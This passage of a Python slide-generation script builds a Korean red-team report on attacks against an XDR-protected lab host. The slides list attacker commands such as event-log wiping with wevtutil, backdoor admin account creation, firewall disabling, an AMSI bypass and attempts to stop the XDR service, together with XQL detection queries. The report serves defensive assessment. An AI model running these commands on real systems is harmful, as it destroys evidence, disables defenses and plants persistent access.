  ('HIGH','AMSI 우회 감지','amsiInitFailed 리플렉션 패턴','T1562.001',FAIL_C,FAIL_BG),
  ('HIGH','이벤트 로그 삭제','wevtutil cl Security/System','T1070.001',FAIL_C,FAIL_BG),
  ('MED','Meterpreter 실행','svchost_update.exe 의심 PE','T1059.001',AMB_C,AMB_BG),
  ('MED','백도어 계정 생성','net user support + Administrators','T1136.001',AMB_C,AMB_BG),
  ('MED','schtasks 등록','WindowsUpdate /ru SYSTEM','T1053.005',AMB_C,AMB_BG),
  ('LOW','certutil/bitsadmin','LOLBin 네트워크 요청','T1218',GREEN,GRN_PAL),
  ('LOW','방화벽 비활성화','netsh advfirewall allprofiles off','T1562.004',GREEN,GRN_PAL),
]
for i,(lvl,name,detail,m,fc,bg) in enumerate(det):
    yy = y0+0.52+i*0.56
    rct(s,0.28,yy,0.72,0.44,bg,fc,0.8)
    tb(s,lvl,0.28,yy+0.05,0.72,0.36,sz=9,bold=True,col=fc,align=PP_ALIGN.CENTER)
    tb(s,f'{name}',0.05+1.05,yy+0.02,5.0,0.22,sz=10,bold=True,col=TEXT)
    tb(s,f'{detail}  ·  {m}',0.05+1.05,yy+0.24,5.0,0.18,sz=8.5,col=GRAY)

# Right: Self-Protection + XQL
rct(s,6.6,y0,6.53,5.8,RGBColor(0xFF,0xFE,0xFF),HDR,1.2)
rct(s,6.6,y0,6.53,0.42,HDR)
tb(s,'XDR Self-Protection + XSIAM XQL',6.75,y0+0.05,6.3,0.34,sz=13,bold=True,col=WHITE)

tb(s,'★ Administrator 권한으로 시도한 XDR 종료 — 전부 실패',
   6.75,y0+0.56,6.3,0.32,sz=11,bold=True,col=FAIL_C)

cmds=[
    'sc.exe stop cyserver        →  액세스가 거부되었습니다',
    'Stop-Service cyserver       →  Access Denied',
    'taskkill /PID 5760 /F       →  액세스가 거부되었습니다',
    'net stop cyserver           →  시스템 오류 5: 액세스 거부',
]
for i,c in enumerate(cmds):
    rct(s,6.7,y0+0.96+i*0.38,6.35,0.34,RGBColor(0x0A,0x0A,0x18))
    tb(s,c,6.78,y0+0.98+i*0.38,6.2,0.3,sz=9.5,col=RGBColor(0xFC,0xA5,0xA5),font='Courier New')

tb(s,'XSIAM XQL – 검증 쿼리',6.75,y0+2.6,6.3,0.32,sz=11,bold=True,col=HDR)
xqls=[
    ('전체 알림','dataset = alerts | filter host_name = "Song-Test-oc"\n| fields alert_name, actor_process_image_name, event_timestamp\n| sort desc event_timestamp'),
    ('LSASS 접근','dataset = xdr_data | filter event_type = "PROCESS"\n  and actor_process_image_name ~= "lsass"\n| fields agent_hostname, action_process_image_name'),
    ('이벤트 로그 삭제','dataset = xdr_data | filter event_type = "PROCESS"\n  and action_process_image_name ~= "wevtutil"\n| fields agent_hostname, action_process_image_command_line'),
]
for i,(title,q) in enumerate(xqls):
    yy=y0+2.98+i*0.88
    rct(s,6.7,yy,6.35,0.28,GRN_LT)
    tb(s,title,6.78,yy+0.04,6.2,0.22,sz=10,bold=True,col=HDR)
    rct(s,6.7,yy+0.3,6.35,0.52,CMD_BG)
    tb(s,q,6.78,yy+0.33,6.2,0.46,sz=8.5,col=CMD_TXT,font='Courier New')

# ══════════════════════════════════════════════════════════════
# SLIDE 8 – Key Findings
# ══════════════════════════════════════════════════════════════
s = new_slide()
y0 = title_bar(s,'주요 발견 사항 및 권고사항','Key Findings · Recommendations · Attack Success Rate')

# Stats row
stats=[('44','총 공격',GREEN),('40','성공',RGBColor(0x16,0xA3,0x4A)),
       ('4','실패',FAIL_C),('11','MITRE 전술',HDR),
       ('2','XDR 차단',BLK_C),('15+','XDR 탐지',AMB_C)]
for i,(v,l,c) in enumerate(stats):
    x=0.3+i*2.15
    rct(s,x,y0,1.95,1.5,GRN_PAL,c,1.2)
    tb(s,v,x+0.05,y0+0.1,1.85,0.8,sz=46,bold=True,col=c,align=PP_ALIGN.CENTER)
    tb(s,l,x+0.05,y0+0.95,1.85,0.4,sz=12,col=TEXT,align=PP_ALIGN.CENTER)

findings=[
    ('CRITICAL','AMSI 우회 성공 → 메모리 기반 페이로드 완전 탐지 공백',FAIL_C,FAIL_BG),
    ('CRITICAL','LSASS 메모리 덤프 116KB 생성 → 자격증명 탈취 후 래터럴 무브 가능',FAIL_C,FAIL_BG),
    ('CRITICAL','이벤트 로그 전체 삭제(Security+System) 성공 → 포렌식 불가',FAIL_C,FAIL_BG),
    ('HIGH',    'Ubuntu webadmin sudo 권한 과잉 → password 없이 root 전환 가능',AMB_C,AMB_BG),
    ('HIGH',    '백도어 계정 support + Administrators 등록 → 독립 재진입 경로',AMB_C,AMB_BG),
    ('HIGH',    'DVWA/WebGoat 다중 웹 취약점 (SQLi/XSS/LFI/IDOR) 미패치 상태',AMB_C,AMB_BG),
    ('MEDIUM',  'MySQL root 패스워드 없음 → DB 전체 무인증 접근',GREEN,GRN_LT),
    ('CONFIRM', 'XDR Self-Protection 정상 동작 — Administrator도 서비스 종료 불가',HDR,GRN_LT),
    ('CONFIRM', 'Bind.exe 연결 직후 XDR 자동 프로세스 차단 확인',HDR,GRN_LT),
]
for i,(lvl,msg,fc,bg) in enumerate(findings):
    yy=y0+1.63+i*0.54
    rct(s,0.3,yy,1.1,0.46,bg,fc,0.9)
    tb(s,lvl,0.3,yy+0.05,1.1,0.36,sz=10,bold=True,col=fc,align=PP_ALIGN.CENTER)
    rct(s,1.5,yy,11.55,0.46,RGBColor(0xF9,0xFA,0xFB),GRN_LT,0.5)
    tb(s,msg,1.65,yy+0.07,11.2,0.34,sz=12,col=TEXT)

# ── Save ──────────────────────────────────────────────────────
OUT='/Users/songhyeonsu/Desktop/python/RedTeam_Attack_Report_v3.pptx'
prs.save(OUT)
print(f'Saved → {OUT}  ({len(prs.slides)} slides)')
